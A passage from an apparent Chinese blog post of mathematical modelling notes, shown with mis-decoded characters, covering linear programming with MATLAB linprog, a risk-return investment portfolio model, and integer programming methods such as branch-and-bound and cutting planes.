(1.1)\\<br>a_{11}x_{1}+a_{12}x_{2}+\ldots+a_{1n}x_{n} &#x3D; b_{1} \\<br>a_{21}x_{1}+a_{22}x_{2}+\ldots+a_{2n}x_{n} &#x3D; b_{2}  \ldots (1.2)\\<br>\ldots \\<br>a_{n1}x_{1}+a_{n2}x_{2}+\ldots+a_{nn}x_{n} &#x3D; b_{n}\\<br>\end{cases}</p><p>å…¶ä¸­ï¼Œ$x_{i}\ge0$ , $b_{j}\ge0$ , $(i,j)\in(1,2,\ldots,n)^2$ , $C$ , $X$è¡¨ç¤ºçŸ©é˜µ</p><p>å˜é‡ $X$ ç§°ä¸ºå†³ç­–å˜é‡ï¼Œå¼(1.1)ç§°ä¸ºé—®é¢˜çš„ç›®æ ‡å‡½æ•°ï¼Œ(1.2)ä¸­çš„å‡ ä¸ªä¸ç­‰å¼ç§°ä¸ºçº¦æŸæ¡ä»¶ï¼Œè®°ä¸ºs.t.</p><p>å¦‚æœç›®æ ‡å‡½æ•°æ˜¯æ±‚æœ€å°å€¼ $minZ &#x3D; CX$ ï¼Œä»¤ $S&#x3D;-Z$ï¼Œåˆ™$maxS&#x3D;-CX$ã€‚</p><h2 id="çº¿æ€§è§„åˆ’é—®é¢˜çš„MATLABæ±‚è§£"><a href="#çº¿æ€§è§„åˆ’é—®é¢˜çš„MATLABæ±‚è§£" class="headerlink" title="çº¿æ€§è§„åˆ’é—®é¢˜çš„MATLABæ±‚è§£"></a>çº¿æ€§è§„åˆ’é—®é¢˜çš„MATLABæ±‚è§£</h2><p>åœ¨MATLABä¸­ï¼Œçº¿æ€§è§„åˆ’çš„ç›®æ ‡å‡½æ•°é»˜è®¤ä¸ºæœ€å°å€¼ï¼Œå…¶è§„èŒƒå½¢å¼ä¸ºï¼š</p><p>$$s.t.<br>\begin{cases}<br>Ax\le b\\<br>Aeq.x&#x3D;beq\\<br>lb\le x \le ub\\<br>\end{cases}$$</p><p>å…¶ä¸­ï¼Œ $c,x,b,beq,lb,ub$ ä¸ºåˆ—å‘é‡ï¼Œ $f$ ç§°ä¸ºä»·å€¼å‘é‡ï¼Œ $b$ ç§°ä¸ºèµ„æºå‘é‡ï¼Œ $A,Aeq$ ä¸ºçŸ©é˜µ</p><p>MATLABå†…ç½®å‡½æ•°æ”¯æŒä¸‰ç§æ¨¡å¼çš„çº¿æ€§è§„åˆ’é—®é¢˜çš„æ±‚è§£:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">[x,fval] = linprog(c,A,b)<br>[x,fval] = linprog(c,A,b,Aeq,beq)<br>[x,fval] = linprog(c,A,b,Aeq,beq,lb,ub)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­xè¿”å›çš„æ˜¯å†³ç­–å˜é‡çš„å–å€¼ï¼Œfvalè¿”å›çš„æ˜¯ç›®æ ‡å‡½æ•°çš„æœ€ä¼˜å€¼ï¼Œcä¸ºä»·å€¼å‘é‡ï¼ŒAï¼Œbå¯¹åº”çš„æ˜¯çº¿æ€§ä¸ç­‰å¼çº¦æŸï¼ŒAeqï¼Œbeqå¯¹åº”çš„æ˜¯çº¿æ€§ç­‰å¼çº¦æŸï¼Œlbå’Œubå¯¹åº”å†³ç­–å‘é‡çš„ä¸‹ç•Œå’Œä¸Šç•Œã€‚</p><h2 id="ä¸€é“ä¾‹é¢˜"><a href="#ä¸€é“ä¾‹é¢˜" class="headerlink" title="ä¸€é“ä¾‹é¢˜"></a>ä¸€é“ä¾‹é¢˜</h2><p>$$<br>max\ z&#x3D;2x_{1}+3x_{2}-5x_{3}<br>$$</p><p>$$s.t.<br>\begin{cases}<br>x_{1}+x_{2}+x_{3}&#x3D;7\\<br>2x_{1}-5x_{2}+x_{3}\ge 10\\<br>x_{1}+3x_{2}+x_{3}\le 12\\<br>x_{1},x_{2},x_{3}\ge 0<br>\end{cases}$$</p><p><strong>MATLABä»£ç å¦‚ä¸‹ï¼š</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">f=[<span class="hljs-number">-2</span>;<span class="hljs-number">-3</span>;<span class="hljs-number">5</span>];<br>a=[<span class="hljs-number">-2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">-1</span>;<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>];<br>b=[<span class="hljs-number">-10</span>;<span class="hljs-number">12</span>];<br>aeq=[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>];<br>beq=<span class="hljs-number">7</span>;<br>[x,y]=linprog(f,a,b,aeq,beq,<span class="hljs-built_in">zeros</span>(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>));<br>x,y=-y<br></code></pre></td></tr></table></figure><h2 id="å¯è½¬åŒ–ä¸ºçº¿æ€§è§„åˆ’çš„é—®é¢˜"><a href="#å¯è½¬åŒ–ä¸ºçº¿æ€§è§„åˆ’çš„é—®é¢˜" class="headerlink" title="å¯è½¬åŒ–ä¸ºçº¿æ€§è§„åˆ’çš„é—®é¢˜"></a>å¯è½¬åŒ–ä¸ºçº¿æ€§è§„åˆ’çš„é—®é¢˜</h2><p>è§„åˆ’é—®é¢˜ä¸º</p><p>$$min\ \left| x_{1} \right|+\left| x_{2} \right|+ \ldots + \left| x_{n} \right|\\<br>s.t.\ Ax\le b$$</p><p>å…¶ä¸­ $x&#x3D;\begin{bmatrix}x_{1}&amp;\ldots&amp;x_{n} \end{bmatrix}^{T}$ </p><p>äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹å¤„ç†ï¼š</p><p>å– $$u_{i}&#x3D;\frac{x_{i}+\left| x_{i} \right|}{2}$$</p><p>$$v_{i}&#x3D;\frac{-x_{i}+\left| x_{i} \right|}{2}$$</p><p>è¿™æ ·å°±æŠŠä¸Šé¢çš„é—®é¢˜è½¬åŒ–ä¸ºäº†ï¼š</p><p>$$<br>min\ \sum_{i&#x3D;1}^{n}(u_{i}+v_{i})<br>$$</p><p>$$s.t.<br>\begin{cases}<br>A(u-v)\le b\\<br>u,v\ge 0\\<br>\end{cases}$$</p><h2 id="å®¡é¢˜åˆ°å»ºæ¨¡å…¨è¿‡ç¨‹åˆ†æ"><a href="#å®¡é¢˜åˆ°å»ºæ¨¡å…¨è¿‡ç¨‹åˆ†æ" class="headerlink" title="å®¡é¢˜åˆ°å»ºæ¨¡å…¨è¿‡ç¨‹åˆ†æ"></a>å®¡é¢˜åˆ°å»ºæ¨¡å…¨è¿‡ç¨‹åˆ†æ</h2><p>å¸‚åœºä¸Šæœ‰nç§èµ„äº§ $s_{i}$ ï¼ˆi&#x3D;1,2,L,nï¼‰ å¯ä¾›é€‰æ‹©ï¼Œç°ç”¨æ•°é¢ä¸ºMçš„ç›¸å½“å¤§çš„èµ„é‡‘ä½œä¸ºä¸€ä¸ªæ—¶æœŸçš„æŠ•èµ„ã€‚è¿™ç§nèµ„äº§åœ¨è¿™ä¸€æ—¶æœŸå†…è´­ä¹° $s_{i}$ çš„å¹³å‡æ”¶ç›Šä¸º $r_{i}$ ï¼Œé£é™©æŸå¤±ç‡ä¸º $q_{i}$ ï¼ŒæŠ•èµ„è¶Šåˆ†æ•£ï¼Œæ€»çš„é£é™©è¶Šå°‘ï¼Œæ€»ä½“é£é™©å¯ç”¨æŠ•èµ„çš„ $s_{i}$ æœ€å¤§çš„ä¸€ä¸ªé£é™©æ¥åº¦é‡ã€‚</p><p>è´­ä¹° $s_{i}$ æ—¶éœ€è¦äº¤ä»˜äº¤æ˜“è´¹ï¼Œè´¹ç‡ä¸º $p_{i}$ ï¼Œå½“è´­ä¹°é¢ä¸è¶…è¿‡ç»™å®šå€¼ $u_{i}$ æ—¶ï¼Œäº¤æ˜“è´¹æŒ‰è´­ä¹° $u_{i}$ è®¡ç®—ã€‚å¦å¤–ï¼Œå‡å®šåŒæœŸé“¶è¡Œå­˜æ¬¾åˆ©ç‡æ—¶ $r_{0}$ ï¼Œæ—¢æ— äº¤æ˜“è´¹åˆæ— é£é™©ã€‚ï¼ˆ$r_{0}$&#x3D;5%ï¼‰ã€‚n&#x3D;4æ—¶ï¼Œç›¸å…³æ•°æ®å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>$s_{i}$</th><th>$r_{i}$(%)</th><th>$q_{i}$(%)</th><th>$p_{i}$(%)</th><th>$u_{i}$(å…ƒ)</th></tr></thead><tbody><tr><td>$u_{i}$</td><td>28</td><td>2.5</td><td>1</td><td>103</td></tr><tr><td>$s_{2}$</td><td>21</td><td>1.5</td><td>2</td><td>198</td></tr><tr><td>$s_{3}$</td><td>23</td><td>5.5</td><td>4.5</td><td>52</td></tr><tr><td>$s_{4}$</td><td>25</td><td>2.6</td><td>6.5</td><td>40</td></tr></tbody></table><p>è¯•ç»™è¯¥å…¬å¸è®¾è®¡ä¸€ç§æŠ•èµ„ç»„åˆæ–¹æ¡ˆï¼Œå³ç»™å®šèµ„é‡‘Mï¼Œæœ‰é€‰æ‹©åœ°è´­ä¹°è‹¥å¹²ç§èµ„äº§æˆ–å­˜é“¶è¡Œç”Ÿæ¯ï¼Œä½¿å‡€æ”¶ç›Šå°½å¯èƒ½å¤§ï¼Œä½¿æ€»ä½“é£é™©å°½å¯èƒ½å°ã€‚</p><h3 id="ç¬¦å·è§„å®š"><a href="#ç¬¦å·è§„å®š" class="headerlink" title="ç¬¦å·è§„å®š"></a>ç¬¦å·è§„å®š</h3><p>$s_{i}$ è¡¨ç¤ºç¬¬iç§æŠ•èµ„é¡¹ç›®ï¼Œå¦‚è‚¡ç¥¨ï¼Œå€ºåˆ¸ç­‰ï¼Œ$i&#x3D;0,1,L,n$,å…¶ä¸­ $s_{0}$ æŒ‡å­˜å…¥é“¶è¡Œï¼›$r_{i},p_{i},q_{i}$ åˆ†åˆ«è¡¨ç¤º $s_{i}$ çš„å¹³å‡æ”¶ç›Šç‡ã€äº¤æ˜“è´¹ç‡ã€é£é™©æŸå¤±ç‡ï¼Œ$i&#x3D;0,L,n$,å…¶ä¸­ $p_{0}&#x3D;0,q_{0}&#x3D;0$ï¼Œ<br>$u_{i}$ è¡¨ç¤º $s_{i}$ çš„äº¤æ˜“å®šé¢ï¼Œ$i&#x3D;1,L,n;x_{i}$ è¡¨ç¤ºæŠ•èµ„é¡¹ç›® $s_{i}$ çš„èµ„é‡‘ï¼Œ$i&#x3D;0,1,L,n$ ; $a$ è¡¨ç¤ºæŠ•èµ„é£é™©åº¦ï¼Œ$Q$ è¡¨ç¤ºæ€»ä½“æ”¶ç›Šã€‚</p><h3 id="åŸºæœ¬å‡è®¾"><a href="#åŸºæœ¬å‡è®¾" class="headerlink" title="åŸºæœ¬å‡è®¾"></a>åŸºæœ¬å‡è®¾</h3><ol><li>æŠ•èµ„æ•°é¢Mç›¸å½“å¤§ï¼Œå‡è®¾M&#x3D;1</li><li>æŠ•èµ„è¶Šåˆ†æ•£ï¼Œæ€»é£é™©è¶Šå°</li><li>æ€»ä½“é£é™©ç”¨æŠ•èµ„é¡¹ç›® $s_{i}$ ä¸­æœ€å¤§çš„ä¸€ä¸ªæ¥è¡¡é‡</li><li>n+1ç§èµ„äº§ä¹‹é—´ç›¸äº’ç‹¬ç«‹</li><li>æŠ•èµ„æœŸé—´å„é¡¹åˆ©ç‡ä¸ºå®šå€¼</li><li>å‡€æ”¶ç›Šå’Œæ€»ä½“é£é™©ä¸å—å…¶ä»–å› ç´ å½±å“</li></ol><h3 id="åŸºäºå‡è®¾æŠ½è±¡å‡ºæ•°å­¦æ¨¡å‹"><a href="#åŸºäºå‡è®¾æŠ½è±¡å‡ºæ•°å­¦æ¨¡å‹" class="headerlink" title="åŸºäºå‡è®¾æŠ½è±¡å‡ºæ•°å­¦æ¨¡å‹"></a>åŸºäºå‡è®¾æŠ½è±¡å‡ºæ•°å­¦æ¨¡å‹</h3><p>1.æ€»ä½“é£é™©ç”¨æœ€å¤§çš„ä¸€ä¸ªæ¥è¡¡é‡ï¼Œå³ï¼š</p><p>$$max{q_{i}x_{i}|i&#x3D;1,2,L,n}$$</p><p>2.è´­ä¹° $s_{i}$ æ‰€é™„çš„äº¤æ˜“è´¹æ˜¯ä¸€ä¸ªä¸ $x_{i}$ ç›¸å…³çš„å‡½æ•°ï¼Œå³ï¼š</p><p>$$f(x)&#x3D;<br>\begin{cases}<br>p_{i}x_{i},x_{i}\ge u_{i} \\<br> \\<br>p_{i}u_{i},x_{i}\le u_{i} \\<br>\end{cases}$$</p><p>è€Œé¢˜ç›®æ‰€ç»™çš„å®šå€¼ $u_{i}$ ç›¸å¯¹æ€»æŠ•èµ„å¾ˆå°ï¼Œæ‰€ä»¥è´­ä¹° $s_{i}$ éƒ½æ”¶ç›Šå¯ä»¥ç®€åŒ–ä¸º $(r_{i}-p_{i})x_{i}$ã€‚</p><p>3.è¦ä½¿å‡€æ”¶ç›Šå°½å¯èƒ½æ‰“ï¼Œæ€»ä½“é£é™©å°½å¯èƒ½å°ï¼Œè¿™æ˜¯ä¸€ä¸ªå¤šç›®æ ‡è§„åˆ’æ¨¡å‹ï¼Œéœ€è¦è½¬åŒ–ã€‚</p><p>ç›®æ ‡å‡½æ•°ä¸ºï¼š</p><p>$$\begin{cases}<br>max\ \sum_{i&#x3D;0}^{n}(r_{i}-p_{i})x_{i} \\<br> \\<br>min{max{q_{i}x_{i}}}<br>\end{cases}$$</p><p>çº¦æŸæ¡ä»¶ä¸ºï¼š</p><p>$$\begin{cases}<br>\sum_{i&#x3D;0}^{n}(1+p_{i})x_{i}&#x3D;M \\<br> \\<br>x_{i}\ge 0,  i&#x3D;0,1,\ldots n\\<br>\end{cases}$$</p><p><strong>æ¨¡å‹ä¸€ï¼š</strong>å›ºå®šé£é™©æ°´å¹³ï¼Œæœ€å¤§åŒ–ä¼˜åŒ–æ”¶ç›Š</p><p>ç»™å®šä¸€ä¸ªé£é™©ç•Œé™aï¼Œä½¿æœ€å¤§çš„ä¸€ä¸ªé£é™©æ»¡è¶³æ¡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥æ‰¾åˆ°ç›¸åº”çš„æŠ•èµ„æ–¹æ¡ˆã€‚</p><p>$$<br>max\ \sum_{i&#x3D;0}^{n}(r_{i}-p_{i})x_{i}<br>$$</p><p>$$s.t.<br>\begin{cases}<br>\frac{q_{i}x_{i}}{M} \le a \\<br> \\<br>\sum_{i&#x3D;0}^{n}(1+p_{i})x_{i}&#x3D;M \\<br>\end{cases}$$</p><p>ä»£å…¥æ•°æ®å¯å¾—åˆ°ä»¥ä¸‹å…¬å¼ï¼š</p><p>$$<br>min\ f&#x3D;(-0.05,-0.27,-0.19,-0.185,-0,185)(x_{0},x_{1},x_{2},x_{3},x_{4})^{T}<br>$$</p><p>$$s.t.<br>\begin{cases}<br>x_{0}+1.01x_{1}+1.02x_{2}+1.045x_{3}+1.065x_{4}&#x3D;1\\<br>0.025x_{1}\le a\\<br>0.015x_{2}\le a\\<br>0.055x_{3}\le a\\<br>0.026x_{4}\le a\\<br>x_{i}\ge 0<br>\end{cases}$$</p><p>ç”±äºaæ˜¯ä»»æ„ç»™å®šçš„é£é™©åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ä»a&#x3D;0å¼€å§‹ï¼Œä»¥æ­¥é•¿ $\Delta a&#x3D;0.001$ è¿›è¡Œå¾ªç¯æœç´¢,ç¨‹åºå¦‚ä¸‹ï¼š</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">clc,clear<br>a=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">hold</span> on<br><span class="hljs-keyword">while</span> a&lt;<span class="hljs-number">0.05</span><br>    c=[<span class="hljs-number">-0.05</span>,<span class="hljs-number">-0.27</span>,<span class="hljs-number">-0.19</span>,<span class="hljs-number">-0.185</span>,<span class="hljs-number">-0.185</span>];<br>    A=[<span class="hljs-built_in">zeros</span>(<span class="hljs-number">4</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">diag</span>([<span class="hljs-number">0.025</span>,<span class="hljs-number">0.015</span>,<span class="hljs-number">0.055</span>,<span class="hljs-number">0.026</span>])]<br>    b=a*<span class="hljs-built_in">ones</span>(<span class="hljs-number">4</span>,<span class="hljs-number">1</span>);<br>    Aeq=[<span class="hljs-number">1</span>,<span class="hljs-number">1.01</span>,<span class="hljs-number">1.02</span>,<span class="hljs-number">1.045</span>,<span class="hljs-number">1.065</span>];<br>    beq=<span class="hljs-number">1</span>;<br>    LB=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>);<br>    [x,Q]=linprog(c,A,b,Aeq,beq,LB);<br>    Q=-Q;<span class="hljs-built_in">plot</span>(a,Q,<span class="hljs-string">&#x27;*k&#x27;</span>);<br>    a=a+<span class="hljs-number">0.001</span>;<br><span class="hljs-keyword">end</span><br>xlabel(<span class="hljs-string">&#x27;a&#x27;</span>),ylabel(<span class="hljs-string">&#x27;Q&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹å›¾å½¢<br><img src="/Pictures/MCM/01/plot01.png" alt="img"></p><p>åˆ†æå›¾å½¢å¯çŸ¥ï¼Œéšç€é£é™©åº¦æå‡ï¼Œæ”¶ç›Šä¸Šå‡ã€‚å…¶ä¸­æœ‰ä¸¤ä¸ªæ‹ç‚¹æˆ‘ä»¬å¯ä»¥é‡ç‚¹å…³æ³¨ï¼š<br>a&#x3D;0.006å’Œa&#x3D;0.025<br>å¯ä»¥ç»“åˆæ¥ä¸‹æ¥çš„æ¨¡å‹è¿›ä¸€æ­¥åˆ†æã€‚</p><p><strong>æ¨¡å‹äºŒï¼š</strong>å›ºå®šç›ˆåˆ©æ°´å¹³ï¼Œæå°åŒ–é£é™©</p><p>$$<br>min (max {q_{i}x_{i}})<br>$$</p><p>$$s.t<br>\begin{cases}<br>\sum_{i&#x3D;0}^{n}(r_{i}-p_{i})x_{i} \ge k\\<br> \\<br>\sum_{i&#x3D;0}^{n}(1+p_{i})x_{i}&#x3D;M \\<br>\end{cases}$$</p><p><strong>æ¨¡å‹ä¸‰ï¼š</strong>å¯¹é£é™©å’Œæ”¶ç›Šèµ‹ç»™æƒé‡så’Œï¼ˆ1-sï¼‰ï¼Œsç§°ä¸ºæŠ•èµ„åå¥½ç³»æ•°ã€‚</p><p>$$<br>min\ (s*{max{q_{i}x_{i}}}) -(1-s) \sum_{i&#x3D;0}^{n}(r_{i}-p_{i})x_{i}<br>$$</p><p>$$<br>s.t.\ \sum_{i&#x3D;0}^{n}(1+p_{i})x_{i}&#x3D;M<br>$$</p><h1 id="æ•´æ•°è§„åˆ’æ¨¡å‹"><a href="#æ•´æ•°è§„åˆ’æ¨¡å‹" class="headerlink" title="æ•´æ•°è§„åˆ’æ¨¡å‹"></a>æ•´æ•°è§„åˆ’æ¨¡å‹</h1><p>è‹¥æ•°å­¦è§„åˆ’ä¸­çš„å˜é‡ï¼ˆéƒ¨åˆ†æˆ–å…¨éƒ¨ï¼‰é™åˆ¶ä¸ºæ•´æ•°æ—¶ï¼Œç§°ä¸ºæ•´æ•°è§„åˆ’ã€‚è‹¥åœ¨çº¿æ€§è§„åˆ’æ¨¡å‹ä¸­ï¼Œå˜é‡é™åˆ¶ä¸ºæ•´æ•°ï¼Œåˆ™ç§°ä¸ºæ•´æ•°çº¿æ€§è§„åˆ’ï¼ˆIPï¼‰ã€‚ç›®å‰è¯æ²¡æœ‰ä¸€ç§æ–¹æ³•èƒ½æœ‰æ•ˆåœ°æ±‚è§£ä¸€åˆ‡æ•´æ•°è§„åˆ’ã€‚</p><p>æ•´æ•°è§„åˆ’æœ‰ä¸‹é¢ä¸€äº›ç‰¹ç‚¹ï¼š</p><ol><li>åŸçº¿æ€§è§„åˆ’æœ€ä¼˜è§£å…¨æ˜¯æ•´æ•°ï¼Œåˆ™æ•´æ•°è§„åˆ’ä¸çº¿æ€§è§„åˆ’æœ€ä¼˜è§£ä¸€è‡´ã€‚</li><li>æ•´æ•°è§„åˆ’æ— å¯è¡Œè§£ã€‚</li><li>æœ‰å¯è¡Œè§£ï¼Œä½†æœ€ä¼˜è§£å˜å·®ã€‚</li><li>æ•´æ•°è§„åˆ’æ±‚æœ€ä¼˜è§£ä¸èƒ½æŒ‰ç…§å®æ•°æœ€ä¼˜è§£ç®€å•å–æ•´æ‰€å¾—ã€‚</li></ol><p>ä¾ç…§å†³ç­–å˜é‡å–è¯è¦æ±‚çš„ä¸åŒï¼Œæ•´æ•°è§„åˆ’å¯åˆ†ä¸º<strong>çº¯æ•´æ•°è§„åˆ’ã€å…¨æ•´æ•°è§„åˆ’ã€æ··åˆæ•´æ•°è§„åˆ’ã€0-1æ•´æ•°è§„åˆ’ã€‚</strong></p><ul><li><p>çº¯æ•´æ•°è§„åˆ’</p><blockquote><p>æ‰€æœ‰å†³ç­–å˜é‡è¦æ±‚å–éè´Ÿæ•´æ•°ã€‚</p></blockquote></li><li><p>å…¨æ•´æ•°è§„åˆ’</p><blockquote><p>é™¤äº†æ‰€æœ‰å†³ç­–å˜é‡è¦æ±‚éè´Ÿæ•´æ•°å¤–ï¼Œç³»æ•° $a_{ij}$ å’Œå¸¸æ•° $b_{i}$ ä¹Ÿè¦æ±‚å–æ•´æ•°ã€‚</p></blockquote></li><li><p>æ··åˆæ•´æ•°è§„åˆ’</p><blockquote><p>åªæœ‰ä¸€éƒ¨åˆ†å†³ç­–å˜é‡è¦æ±‚å–éè´Ÿæ•´æ•°ã€‚</p></blockquote></li><li><p>0-1æ•´æ•°è§„åˆ’</p><blockquote><p>æ‰€æœ‰å†³ç­–å˜é‡åªèƒ½å–0æˆ–1ä¸¤ä¸ªæ•´æ•°ã€‚</p></blockquote></li></ul><h2 id="æ•´æ•°çº¿æ€§è§„åˆ’çš„æ±‚è§£æ–¹æ³•"><a href="#æ•´æ•°çº¿æ€§è§„åˆ’çš„æ±‚è§£æ–¹æ³•" class="headerlink" title="æ•´æ•°çº¿æ€§è§„åˆ’çš„æ±‚è§£æ–¹æ³•"></a>æ•´æ•°çº¿æ€§è§„åˆ’çš„æ±‚è§£æ–¹æ³•</h2><p>è®¾æ•´æ•°è§„åˆ’é—®é¢˜å¦‚ä¸‹ï¼š</p><p>$$<br>max\ z &#x3D; x_{1}+x_{2}<br>$$</p><p>$$\begin{cases}<br>14x_{1}+9x_{2}\le 51 \\<br>-6x_{1}+3x_{2}\le 1 \\<br>x_{1},x_{2}\ge 0 ä¸”ä¸ºæ•´æ•° \\<br>\end{cases}$$</p><p>é¦–å…ˆä¸è€ƒè™‘æ•´æ•°çº¦æŸï¼Œå¾—åˆ°çº¿æ€§è§„åˆ’é—®é¢˜ï¼ˆä¸€èˆ¬ç§°ä¸º<strong>æ¾å¼›é—®é¢˜</strong>æˆ–<strong>ä¼´éšé—®é¢˜</strong>ï¼‰</p><p>å¾—å‡ºå›¾åƒå¦‚ä¸‹ï¼š<br><img src="/Pictures/MCM/02/plot01.png" alt="img"></p><p>åœ¨è§£é›†å†…çš„æ‰€æœ‰æ•´æ•°ç‚¹æ‰¾å‡ºï¼Œä¸€ä¸€å¸¦å…¥ï¼Œæ±‚å‡ºæœ€ä¼˜è§£ï¼Œæ­¤æ³•ä¸ºå®Œå…¨æšä¸¾æ³•ï¼Œé€‚ç”¨äºçº¦æŸæ¡ä»¶è¾ƒå°çš„æƒ…å†µã€‚</p><p>ç›®å‰ï¼Œå¸¸ç”¨çš„æ±‚è§£æ•´æ•°è§„åˆ’çš„æ–¹æ³•ï¼š<em>åˆ†æå®šç•Œæ³•ã€å‰²å¹³é¢æ³•</em>ï¼›å¯¹äºç‰¹æ®Šçš„0-1è§„åˆ’é—®é¢˜é‡‡ç”¨<em>éšæšä¸¾æ³•å’ŒåŒˆç‰™åˆ©ç®—æ³•</em>ã€‚</p><h3 id="åˆ†æå®šç•Œæ³•"><a href="#åˆ†æå®šç•Œæ³•" class="headerlink" title="åˆ†æå®šç•Œæ³•"></a>åˆ†æå®šç•Œæ³•</h3><p>é¦–å…ˆä¸è€ƒè™‘æ•´æ•°é™åˆ¶æ±‚å‡ºç›¸åº”çš„æ¾å¼›é—®é¢˜çš„æœ€ä¼˜è§£ï¼Œè‹¥æ¾å¼›é—®é¢˜æ— å¯è¡Œè§£ï¼Œåˆ™ILPæ— å¯è¡Œè§£ã€‚</p><p>è‹¥æ±‚å¾—çš„æ¾å¼›é—®é¢˜æœ€ä¼˜è§£ç¬¦åˆè¯ä¹¦è¦æ±‚ï¼Œåˆ™æ˜¯ILPçš„æœ€ä¼˜è§£ã€‚</p><p>è‹¥ä¸æ»¡è¶³æ•´æ•°æ¡ä»¶ï¼Œåˆ™ä»»é€‰ä¸€ä¸ªä¸æ»¡è¶³æ•´æ•°æ¡ä»¶çš„å˜é‡ $x_{i}^{0}$ æ¥æ„é€ æ–°çš„çº¦æŸæ¡ä»¶æ·»åŠ åˆ°æ¾å¼›é—®é¢˜ä¸­å½¢æˆä¸¤ä¸ªå­é—®é¢˜ï¼ˆåˆ†åˆ«æ·»åŠ ï¼‰ï¼š</p><p>$$<br>x_{i}\le \left [ x_{i}^{0} \right ] ; x_{i} \ge \left [ x_{i}^{0} \right ]+1<br>$$</p><p>ä¾æ¬¡åœ¨ç¼©å°çš„å¯è¡ŒåŸŸä¸­æ±‚è§£æ–°æ„é€ çº¿æ€§è§„åˆ’çš„æœ€ä¼˜è§£ï¼Œå¹¶é‡å¤ä¸Šè¿°è¿‡ç¨‹ç›´åˆ°å­é—®é¢˜æ— è§£æˆ–æœ‰æ•´æ•°æœ€ä¼˜è§£ã€‚</p><h3 id="å‰²å¹³é¢ç®—æ³•"><a href="#å‰²å¹³é¢ç®—æ³•" class="headerlink" title="å‰²å¹³é¢ç®—æ³•"></a>å‰²å¹³é¢ç®—æ³•</h3><p>å‰²å¹³é¢ç®—æ³•çš„åŸºæœ¬æ€æƒ³ï¼š</p><ul><li>å¦‚æœæ¾å¼›é—®é¢˜æ— è§£ï¼Œåˆ™æ•´æ•°è§„åˆ’æ— è§£</li><li>å¦‚æœæ¾å¼›é—®é¢˜çš„æœ€ä¼˜è§£ä¸ºæ•´æ•°å‘é‡ï¼Œåˆ™å…¶ä¹Ÿæ˜¯æ•´æ•°è§„åˆ’çš„æœ€ä¼˜è§£</li><li>å¦‚æœè§£å«æœ‰éæ•´æ•°åˆ†é‡ï¼Œåˆ™å¯¹æ¾å¼›é—®é¢˜æ·»åŠ çº¿æ€§çº¦æŸæ¡ä»¶æ¥è¿›è¡Œâ€œå‰²å¹³é¢â€æ“ä½œï¼Œé‡å¤æ“ä½œç›´åˆ°æ±‚å‡ºè§£æˆ–æ— è§£ã€‚</li></ul><p>$$<br>max\ z&#x3D;x_{1}+x_{2}<br>$$</p><p>$$\begin{cases}<br>-x_{1}+x_{2}\le 1 \\<br>3x_{1}+x_{2}\le 4 \\<br>x_{1},x_{2} \ge 0 ä¸”ä¸ºæ•´æ•°<br>\end{cases}$$</p><p><img src="/Pictures/MCM/02/plot02.png" alt="img"></p><p>æ­¤æ—¶æ¾å¼›é—®é¢˜çš„æœ€ä¼˜è§£ä¸æ˜¯æ•´æ•°ï¼Œæ•…æˆ‘ä»¬åˆ†æå›¾åƒå¯çŸ¥ï¼šyè½´æˆªè·åšå¹³è¡Œçº¿ä¸Šé¢çš„éƒ¨åˆ†æ— æ³•æ»¡è¶³æ•´æ•°è§£ï¼Œæ•…èˆå»ï¼Œä½“ç°åœ¨çº¦æŸæ¡ä»¶ä¸º $x_{2}\le 1$ ã€‚</p><p>å¯¹äºä¸€äº›é—®é¢˜ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨å¼•å…¥æ¾å¼›å˜é‡æ¥å°†ä¸ç­‰å¼çš„çº¦æŸæ¡ä»¶è½¬åŒ–ä¸ºç­‰å¼çº¦æŸæ¡ä»¶ã€‚</p><p>åœ¨ä¸Šé¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥æ¾å¼›å˜é‡ $x_{3},x_{4}$ æ¥å°†ä¸ç­‰çº¦æŸè½¬åŒ–ä¸ºç­‰å¼çº¦æŸï¼š</p><p>$$<br>max\ z&#x3D;x_{1}+x_{2}+0x_{3}+0x_{4}<br>$$</p><p>$$\begin{cases}<br>-x_{1}+x_{2}+x_{3}&#x3D;1 \\<br>3x_{1}+x_{2}+x_{4}&#x3D;4 \\<br>x_{1},x_{2},x_{3},x_{4} \ge 0 ä¸”ä¸ºæ•´æ•°<br>\end{cases}$$</p><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸ªç­‰å¼ï¼Œ<strong>å°†å„å˜é‡çš„ç³»æ•°æ‹†åˆ†ä¸ºæ•´æ•°éƒ¨åˆ†å’Œå°æ•°éƒ¨åˆ†</strong>ã€‚å¯ä»¥å– $x_{3},x_{4}$ 